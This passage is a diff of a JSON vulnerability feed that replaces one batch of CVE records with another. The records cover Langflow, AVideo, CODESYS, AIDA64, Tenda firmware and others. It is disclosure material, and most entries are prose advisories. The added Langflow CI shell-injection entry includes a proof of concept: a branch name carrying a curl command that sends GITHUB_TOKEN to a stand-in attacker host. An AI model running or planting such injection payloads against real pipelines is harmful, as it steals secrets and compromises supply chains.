@@ -2,610 +2,59 @@
   "dataType": "CVE_RECORD",
   "dataVersion": "5.1",
   "cveMetadata": {
-    "total_count": 15,
-    "last_updated": "2026-03-24T13:44:19.360906",
+    "total_count": 65,
+    "last_updated": "2026-03-24T14:46:30.978214",
     "severity_distribution": {
-      "critical": 1,
-      "high": 11,
-      "medium": 2,
-      "low": 0,
-      "none": 1
+      "critical": 4,
+      "high": 21,
+      "medium": 18,
+      "low": 1,
+      "none": 21
     }
   },
   "cves": [
     {
-      "id": "CVE-2026-4283",
-      "publishedDate": "2026-03-24T04:27:50.054Z",
-      "lastModifiedDate": "2026-03-24T13:18:49.435Z",
-      "description": "The WP DSGVO Tools (GDPR) plugin for WordPress is vulnerable to unauthorized account destruction in all versions up to, and including, 3.1.38. This is due to the `super-unsubscribe` AJAX action accepting a `process_now` parameter from unauthenticated users, which bypasses the intended email-confirmation flow and immediately triggers irreversible account anonymization. This makes it possible for unauthenticated attackers to permanently destroy any non-administrator user account (password randomized, username/email overwritten, roles stripped, comments anonymized, sensitive usermeta wiped) by submitting the victim's email address with `process_now=1`. The nonce required for the request is publicly available on any page containing the `[unsubscribe_form]` shortcode.",
+      "id": "CVE-2026-33716",
+      "publishedDate": "2026-03-23T18:46:47.412Z",
+      "lastModifiedDate": "2026-03-24T14:25:27.605Z",
+      "description": "WWBN AVideo is an open source video platform. In versions up to and including 26.0, the standalone live stream control endpoint at `plugin/Live/standAloneFiles/control.json.php` accepts a user-supplied `streamerURL` parameter that overrides where the server sends token verification requests. An attacker can redirect token verification to a server they control that always returns `{\"error\": false}`, completely bypassing authentication. This grants unauthenticated control over any live stream on the platform, including dropping active publishers, starting/stopping recordings, and probing stream existence. Commit 388fcd57dbd16f6cb3ebcdf1d08cf2b929941128 contains a patch.",
+      "severity": 9.4,
+      "references": [
+        {
+          "url": "https://github.com/WWBN/AVideo/security/advisories/GHSA-9hv9-gvwm-95f2",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/WWBN/AVideo/commit/388fcd57dbd16f6cb3ebcdf1d08cf2b929941128",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "WWBN",
+          "product": "AVideo",
+          "versions": [
+            {
+              "version": "<= 26.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-287: Improper Authentication"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33475",
+      "publishedDate": "2026-03-24T12:54:33.369Z",
+      "lastModifiedDate": "2026-03-24T14:04:22.412Z",
+      "description": "Langflow is a tool for building and deploying AI-powered agents and workflows. An unauthenticated remote shell injection vulnerability exists in multiple GitHub Actions workflows in the Langflow repository prior to version 1.9.0. Unsanitized interpolation of GitHub context variables (e.g., `${{ github.head_ref }}`) in `run:` steps allows attackers to inject and execute arbitrary shell commands via a malicious branch name or pull request title. This can lead to secret exfiltration (e.g., `GITHUB_TOKEN`), infrastructure manipulation, or supply chain compromise during CI/CD execution. Version 1.9.0 patches the vulnerability.\n\n---\n\n### Details\n\nSeveral workflows in `.github/workflows/` and `.github/actions/` reference GitHub context variables directly in `run:` shell commands, such as:\n\n```yaml\nrun: |\n  validate_branch_name \"${{ github.event.pull_request.head.ref }}\"\n```\n\nOr:\n\n```yaml\nrun: npx playwright install ${{ inputs.browsers }} --with-deps\n```\n\nSince `github.head_ref`, `github.event.pull_request.title`, and custom `inputs.*` may contain **user-controlled values**, they must be treated as **untrusted input**. Direct interpolation without proper quoting or sanitization leads to shell command injection.\n\n---\n\n### PoC\n\n1. **Fork** the Langflow repository\n2. **Create a new branch** with the name:\n   ```bash\n   injection-test && curl https://attacker.site/exfil?token=$GITHUB_TOKEN\n   ```\n3. **Open a Pull Request** to the main branch from the new branch\n4. GitHub Actions will run the affected workflow (e.g., `deploy-docs-draft.yml`)\n5. The `run:` step containing:\n   ```yaml\n   echo \"Branch: ${{ github.head_ref }}\"\n   ```\n   Will execute:\n   ```bash\n   echo \"Branch: injection-test\"\n   curl https://attacker.site/exfil?token=$GITHUB_TOKEN\n   ```\n\n6. The attacker receives the CI secret via the exfil URL.\n\n---\n\n### Impact\n\n- **Type:** Shell Injection / Remote Code Execution in CI\n- **Scope:** Any public Langflow fork with GitHub Actions enabled\n- **Impact:** Full access to CI secrets (e.g., `GITHUB_TOKEN`), possibility to push malicious tags or images, tamper with releases, or leak sensitive infrastructure data\n\n---\n\n### Suggested Fix\n\nRefactor affected workflows to **use environment variables** and wrap them in **double quotes**:\n\n```yaml\nenv:\n  BRANCH_NAME: ${{ github.head_ref }}\nrun: |\n  echo \"Branch is: \\\"$BRANCH_NAME\\\"\"\n```\n\nAvoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled value.\n\n---\n\n### Affected Files (Langflow `1.3.4`)\n\n- `.github/actions/install-playwright/action.yml`\n- `.github/workflows/deploy-docs-draft.yml`\n- `.github/workflows/docker-build.yml`\n- `.github/workflows/release_nightly.yml`\n- `.github/workflows/python_test.yml`\n- `.github/workflows/typescript_test.yml`",
       "severity": 9.1,
       "references": [
         {
-          "url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/21389122-cb39-45d1-a889-b830d3a55603?source=cve",
-          "type": "reference"
-        },
-        {
-          "url": "https://plugins.trac.wordpress.org/browser/shapepress-dsgvo/tags/3.1.38/public/shortcodes/super-unsubscribe/unsubscribe-form-action.php#L39",
-          "type": "reference"
-        },
-        {
-          "url": "https://plugins.trac.wordpress.org/browser/shapepress-dsgvo/tags/3.1.38/includes/models/unsubscriber.php#L24",
-          "type": "reference"
-        },
-        {
-          "url": "https://plugins.trac.wordpress.org/browser/shapepress-dsgvo/tags/3.1.38/includes/class-sp-dsgvo-data-collecter.php#L250",
-          "type": "reference"
-        },
-        {
-          "url": "https://plugins.trac.wordpress.org/browser/shapepress-dsgvo/trunk/public/shortcodes/super-unsubscribe/unsubscribe-form-action.php#L39",
-          "type": "reference"
-        },
-        {
-          "url": "https://plugins.trac.wordpress.org/browser/shapepress-dsgvo/tags/3.1.38/includes/class-sp-dsgvo-ajax-action.php#L69",
-          "type": "reference"
-        },
-        {
-          "url": "https://plugins.trac.wordpress.org/changeset?old_path=/shapepress-dsgvo/tags/3.1.38&new_path=/shapepress-dsgvo/tags/3.1.39",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "legalweb",
-          "product": "WP DSGVO Tools (GDPR)",
-          "versions": [
-            {
-              "version": "*",
-              "status": "affected",
-              "lessThanOrEqual": "3.1.38",
-              "versionType": "semver"
-            }
-          ],
-          "defaultStatus": "unaffected"
-        }
-      ],
-      "problemType": [
-        "CWE-862 Missing Authorization"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2026-33310",
-      "publishedDate": "2026-03-24T13:17:38.572Z",
-      "lastModifiedDate": "2026-03-24T13:17:38.572Z",
-      "description": "Intake is a package for finding, investigating, loading and disseminating data. Prior to version 2.0.9, the shell() syntax within parameter default values appears to be automatically expanded during the catalog parsing process. If a catalog contains a parameter default such as shell(<command>), the command may be executed when the catalog source is accessed. This means that if a user loads a malicious catalog YAML, embedded commands could execute on the host system. Version 2.0.9 mitigates the issue by making getshell False by default everywhere.",
-      "severity": 8.8,
-      "references": [
-        {
-          "url": "https://github.com/intake/intake/security/advisories/GHSA-37g4-qqqv-7m99",
-          "type": "reference"
-        },
-        {
-          "url": "https://github.com/intake/intake/commit/d0c0b6b57c1cb3f73880655ded4a9b0e18e1fd1b",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "intake",
-          "product": "intake",
-          "versions": [
-            {
-              "version": "< 2.0.9",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
-        "CWE-94: Improper Control of Generation of Code ('Code Injection')"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2025-41660",
-      "publishedDate": "2026-03-24T07:41:43.004Z",
-      "lastModifiedDate": "2026-03-24T13:16:02.920Z",
-      "description": "A low-privileged remote attacker may be able to replace the boot application of the CODESYS Control runtime system, enabling unauthorized code execution.",
-      "severity": 8.8,
-      "references": [
-        {
-          "url": "https://certvde.com/de/advisories/VDE-2026-011",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control RTE (SL)",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "3.5.22.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control RTE (for Beckhoff CX) SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "3.5.22.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control Win (SL)",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "3.5.22.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS HMI (SL)",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "3.5.22.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Runtime Toolkit",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "3.5.22.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for BeagleBone SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for emPC-A/iMX6 SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for IOT2000 SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for Linux ARM SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for Linux SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for PFC100 SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for PFC200 SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for PLCnext SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for Raspberry Pi SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Control for WAGO Touch Panels 600 SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        },
-        {
-          "defaultStatus": "unaffected",
-          "product": "CODESYS Virtual Control SL",
-          "vendor": "CODESYS",
-          "versions": [
-            {
-              "lessThan": "4.21.0.0",
-              "status": "affected",
-              "version": "0.0.0",
-              "versionType": "semver"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "CWE-669 Incorrect Resource Transfer Between Spheres"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2019-25637",
-      "publishedDate": "2026-03-24T11:27:10.071Z",
-      "lastModifiedDate": "2026-03-24T13:25:04.009Z",
-      "description": "X-NetStat Pro 5.63 contains a local buffer overflow vulnerability that allows local attackers to execute arbitrary code by overwriting the EIP register through a 264-byte buffer overflow. Attackers can inject shellcode into memory and use an egg hunter technique to locate and execute the payload when the application processes malicious input through HTTP Client or Rules functionality.",
-      "severity": 8.4,
-      "references": [
-        {
-          "url": "https://www.exploit-db.com/exploits/46596",
-          "type": "poc"
-        },
-        {
-          "url": "https://freshsoftware.com",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.vulncheck.com/advisories/x-netstat-pro-local-buffer-overflow-via-egghunter",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "Freshsoftware",
-          "product": "NetStat Pro",
-          "versions": [
-            {
-              "version": "5.63                                                                                           #",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "Out-of-bounds Write"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2019-25633",
-      "publishedDate": "2026-03-24T11:27:07.254Z",
-      "lastModifiedDate": "2026-03-24T13:08:55.859Z",
-      "description": "AIDA64 Extreme 5.99.4900 contains a structured exception handling buffer overflow vulnerability that allows local attackers to execute arbitrary code by supplying malicious input through the email preferences and report wizard interfaces. Attackers can inject crafted payloads into the Display name field and Load from file parameter to trigger the overflow and execute shellcode with application privileges.",
-      "severity": 8.4,
-      "references": [
-        {
-          "url": "https://www.exploit-db.com/exploits/46636",
-          "type": "poc"
-        },
-        {
-          "url": "https://www.aida64.com",
-          "type": "reference"
-        },
-        {
-          "url": "http://download.aida64.com/aida64extreme599.exe",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.vulncheck.com/advisories/aida64-extreme-seh-buffer-overflow-via-egghunter",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "Aida64",
-          "product": "AIDA64 Extreme",
-          "versions": [
-            {
-              "version": "5.99.4900                                                                               #",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "Out-of-bounds Write"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2019-25631",
-      "publishedDate": "2026-03-24T11:27:05.659Z",
-      "lastModifiedDate": "2026-03-24T13:25:26.341Z",
-      "description": "AIDA64 Business 5.99.4900 contains a structured exception handling buffer overflow vulnerability that allows local attackers to execute arbitrary code by overwriting SEH pointers with malicious shellcode. Attackers can inject egg hunter shellcode through the SMTP display name field in preferences or report wizard functionality to trigger the overflow and execute code with application privileges.",
-      "severity": 8.4,
-      "references": [
-        {
-          "url": "https://www.exploit-db.com/exploits/46639",
-          "type": "poc"
-        },
-        {
-          "url": "https://www.aida64.com",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.aida64.com/downloads",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.vulncheck.com/advisories/aida64-business-seh-buffer-overflow-via-egghunter",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "Aida64",
-          "product": "AIDA64 Business",
-          "versions": [
-            {
-              "version": "5.99.4900                                                                               #",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "Out-of-bounds Write"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2019-25627",
-      "publishedDate": "2026-03-24T11:27:02.248Z",
-      "lastModifiedDate": "2026-03-24T13:15:20.448Z",
-      "description": "FlexHEX 2.71 contains a local buffer overflow vulnerability in the Stream Name field that allows local attackers to execute arbitrary code by triggering a structured exception handler (SEH) overflow. Attackers can craft a malicious text file with carefully aligned shellcode and SEH chain pointers, paste the contents into the Stream Name dialog, and execute arbitrary commands like calc.exe when the exception handler is triggered.",
-      "severity": 8.4,
-      "references": [
-        {
-          "url": "https://www.exploit-db.com/exploits/46665",
-          "type": "poc"
-        },
-        {
-          "url": "http://www.flexhex.com",
-          "type": "reference"
-        },
-        {
-          "url": "http://www.flexhex.com/download/flexhex_setup.exe",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.vulncheck.com/advisories/flexhex-local-buffer-overflow-via-seh-unicode",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "Flexhex",
-          "product": "FlexHEX",
-          "versions": [
-            {
-              "version": "2.71",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "Unrestricted Upload of File with Dangerous Type"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2019-25643",
-      "publishedDate": "2026-03-24T11:27:14.316Z",
-      "lastModifiedDate": "2026-03-24T13:24:38.649Z",
-      "description": "eNdonesia Portal v8.7 contains multiple SQL injection vulnerabilities that allow unauthenticated attackers to execute arbitrary SQL queries by injecting malicious code through the bid parameter. Attackers can send GET requests to banners.php with crafted SQL payloads in the bid parameter to extract sensitive database information from the INFORMATION_SCHEMA tables.",
-      "severity": 8.2,
-      "references": [
-        {
-          "url": "https://www.exploit-db.com/exploits/46559",
-          "type": "poc"
-        },
-        {
-          "url": "http://www.endonesia.org/",
-          "type": "reference"
-        },
-        {
-          "url": "https://sourceforge.net/projects/endonesia/",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.vulncheck.com/advisories/endonesia-portal-sql-injection-via-banners-php",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "Endonesia",
-          "product": "eNdonesia Portal",
-          "versions": [
-            {
-              "version": "8.7",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2019-25639",
-      "publishedDate": "2026-03-24T11:27:11.423Z",
-      "lastModifiedDate": "2026-03-24T13:08:12.060Z",
-      "description": "Matrimony Website Script M-Plus contains multiple SQL injection vulnerabilities that allow unauthenticated attackers to manipulate database queries by injecting SQL code through various POST parameters. Attackers can inject malicious SQL payloads into parameters like txtGender, religion, Fage, and cboCountry across simplesearch_results.php, advsearch_results.php, specialcase_results.php, locational_results.php, and registration2.php to extract sensitive database information or execute arbitrary SQL commands.",
-      "severity": 8.2,
-      "references": [
-        {
-          "url": "https://www.exploit-db.com/exploits/46591",
-          "type": "poc"
-        },
-        {
-          "url": "https://www.matri4web.com",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.vulncheck.com/advisories/matrimony-website-script-m-plus-multiple-sql-injection",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "Matri4Web",
-          "product": "Matrimony Website Script",
-          "versions": [
-            {
-              "version": "M-Plus",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2026-33418",
-      "publishedDate": "2026-03-24T13:25:57.540Z",
-      "lastModifiedDate": "2026-03-24T13:25:57.540Z",
-      "description": "DiceBear is an avatar library for designers and developers. Prior to version 9.4.2, the `ensureSize()` function in `@dicebear/converter` used a regex-based approach to rewrite SVG `width`/`height` attributes, capping them at 2048px to prevent denial of service. This size capping could be bypassed by crafting SVG input that causes the regex to match a non-functional occurrence of `<svg` before the actual SVG root element. When the SVG is subsequently rendered via `@resvg/resvg-js` on the Node.js code path, it renders at the attacker-specified dimensions, potentially causing out-of-memory crashes. In version 9.4.2, the regex-based approach has been replaced with XML-aware processing using `fast-xml-parser` to correctly identify and modify the SVG root element's attributes. Additionally, a `fitTo` constraint has been added to the `renderAsync` call as defense-in-depth, ensuring the rendered output is always bounded regardless of SVG content.",
-      "severity": 7.5,
-      "references": [
-        {
-          "url": "https://github.com/dicebear/dicebear/security/advisories/GHSA-7j2x-32w6-p43p",
-          "type": "reference"
-        }
-      ],
-      "affected": [
-        {
-          "vendor": "dicebear",
-          "product": "dicebear",
-          "versions": [
-            {
-              "version": "< 9.4.2",
-              "status": "affected"
-            }
-          ]
-        }
-      ],
-      "problemType": [
-        "CWE-185: Incorrect Regular Expression"
-      ],
-      "fix_suggestion": "无法生成修复建议"
-    },
-    {
-      "id": "CVE-2026-33484",
-      "publishedDate": "2026-03-24T12:57:33.641Z",
-      "lastModifiedDate": "2026-03-24T12:57:33.641Z",
-      "description": "Langflow is a tool for building and deploying AI-powered agents and workflows. In versions 1.0.0 through 1.8.1, the `/api/v1/files/images/{flow_id}/{file_name}` endpoint serves image files without any authentication or ownership check. Any unauthenticated request with a known flow_id and file_name returns the image with HTTP 200. In a multi-tenant deployment, any attacker who can discover or guess a `flow_id` (UUIDs can be leaked through other API responses) can download any user's uploaded images without credentials. Version 1.9.0 contains a patch.",
-      "severity": 7.5,
-      "references": [
-        {
-          "url": "https://github.com/langflow-ai/langflow/security/advisories/GHSA-7grx-3xcx-2xv5",
+          "url": "https://github.com/langflow-ai/langflow/security/advisories/GHSA-87cc-65ph-2j4w",
           "type": "reference"
         }
       ],
@@ -615,54 +64,1839 @@
           "product": "langflow",
           "versions": [
             {
-              "version": ">= 1.0.0, < 1.9.0",
+              "version": "< 1.9.0",
               "status": "affected"
             }
           ]
         }
       ],
       "problemType": [
-        "CWE-284: Improper Access Control",
-        "CWE-639: Authorization Bypass Through User-Controlled Key",
-        "CWE-862: Missing Authorization"
+        "CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
+        "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
       ],
       "fix_suggestion": "无法生成修复建议"
     },
     {
-      "id": "CVE-2026-4625",
-      "publishedDate": "2026-03-24T02:46:11.088Z",
-      "lastModifiedDate": "2026-03-24T13:24:16.006Z",
-      "description": "A flaw has been found in SourceCodester Online Admission System 1.0. This affects an unknown function of the file /programmes.php. Executing a manipulation of the argument program can lead to sql injection. The attack can be launched remotely. The exploit has been published and may be used.",
-      "severity": 7.3,
+      "id": "CVE-2026-4753",
+      "publishedDate": "2026-03-24T05:41:10.541Z",
+      "lastModifiedDate": "2026-03-24T14:27:54.384Z",
+      "description": "Out-of-bounds Read vulnerability in slajerek RetroDebugger.This issue affects RetroDebugger: before v0.64.72.",
+      "severity": 9.1,
       "references": [
         {
-          "url": "https://vuldb.com/?id.352493",
-          "type": "reference"
-        },
-        {
-          "url": "https://vuldb.com/?ctiid.352493",
-          "type": "reference"
-        },
-        {
-          "url": "https://vuldb.com/?submit.775788",
-          "type": "reference"
-        },
-        {
-          "url": "https://github.com/WHOAMI-xiaoyu/CVE/blob/main/CVE_7.md",
-          "type": "poc"
-        },
-        {
-          "url": "https://www.sourcecodester.com/",
+          "url": "https://github.com/slajerek/RetroDebugger/pull/97",
           "type": "reference"
         }
       ],
       "affected": [
         {
-          "vendor": "SourceCodester",
-          "product": "Online Admission System",
+          "vendor": "slajerek",
+          "product": "RetroDebugger",
+          "collectionURL": "https://github.com/slajerek/RetroDebugger",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "v0.64.72",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-125 Out-of-bounds Read"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4750",
+      "publishedDate": "2026-03-24T05:36:44.407Z",
+      "lastModifiedDate": "2026-03-24T14:31:31.027Z",
+      "description": "Out-of-bounds Read vulnerability in fabiangreffrath woof.This issue affects woof: before woof_15.3.0.",
+      "severity": 9.1,
+      "references": [
+        {
+          "url": "https://github.com/fabiangreffrath/woof/pull/2521",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "fabiangreffrath",
+          "product": "woof",
+          "collectionURL": "https://github.com/fabiangreffrath/woof",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "woof_15.3.0",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-125 Out-of-bounds Read"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33849",
+      "publishedDate": "2026-03-24T05:52:12.272Z",
+      "lastModifiedDate": "2026-03-24T14:16:31.737Z",
+      "description": "Improper Restriction of Operations within the Bounds of a Memory Buffer vulnerability in linkingvision rapidvms.This issue affects rapidvms: before PR#96.",
+      "severity": 8.8,
+      "references": [
+        {
+          "url": "https://github.com/linkingvision/rapidvms/pull/96",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "linkingvision",
+          "product": "rapidvms",
+          "collectionURL": "https://github.com/linkingvision/rapidvms",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "PR#96",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33848",
+      "publishedDate": "2026-03-24T05:51:10.330Z",
+      "lastModifiedDate": "2026-03-24T14:17:00.767Z",
+      "description": "Improper Restriction of Operations within the Bounds of a Memory Buffer vulnerability in linkingvision rapidvms.This issue affects rapidvms: before PR#96.",
+      "severity": 8.8,
+      "references": [
+        {
+          "url": "https://github.com/linkingvision/rapidvms/pull/96",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "linkingvision",
+          "product": "rapidvms",
+          "collectionURL": "https://github.com/linkingvision/rapidvms",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "PR#96",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4639",
+      "publishedDate": "2026-03-24T04:17:21.809Z",
+      "lastModifiedDate": "2026-03-24T14:35:48.182Z",
+      "description": "Vitals ESP developed by Galaxy Software Services has a Incorrect Authorization vulnerability, allowing authenticated remote attackers to perform certain administrative functions, thereby escalating privileges.",
+      "severity": 8.8,
+      "references": [
+        {
+          "url": "https://www.twcert.org.tw/tw/cp-132-10794-704a2-1.html",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.twcert.org.tw/en/cp-139-10795-25784-2.html",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Galaxy Software Services",
+          "product": "Vitals ESP",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThanOrEqual": "6.3",
+              "versionType": "custom"
+            }
+          ],
+          "defaultStatus": "unaffected"
+        }
+      ],
+      "problemType": [
+        "CWE-863 Incorrect Authorization"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4535",
+      "publishedDate": "2026-03-22T03:32:14.994Z",
+      "lastModifiedDate": "2026-03-24T14:30:09.933Z",
+      "description": "A vulnerability has been found in Tenda FH451 1.0.0.9. This vulnerability affects the function WrlclientSet of the file /goform/WrlclientSet. Such manipulation of the argument GO leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.",
+      "severity": 8.8,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352323",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352323",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.774343",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/Litengzheng/vul_db/blob/main/FH451/vul_42/README.md",
+          "type": "poc"
+        },
+        {
+          "url": "https://www.tenda.com.cn/",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Tenda",
+          "product": "FH451",
+          "versions": [
+            {
+              "version": "1.0.0.9",
+              "status": "affected"
+            }
+          ],
+          "cpes": [
+            "cpe:2.3:o:tenda:fh451_firmware:*:*:*:*:*:*:*:*"
+          ]
+        }
+      ],
+      "problemType": [
+        "Stack-based Buffer Overflow",
+        "Memory Corruption"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33513",
+      "publishedDate": "2026-03-23T18:21:59.156Z",
+      "lastModifiedDate": "2026-03-24T14:27:53.769Z",
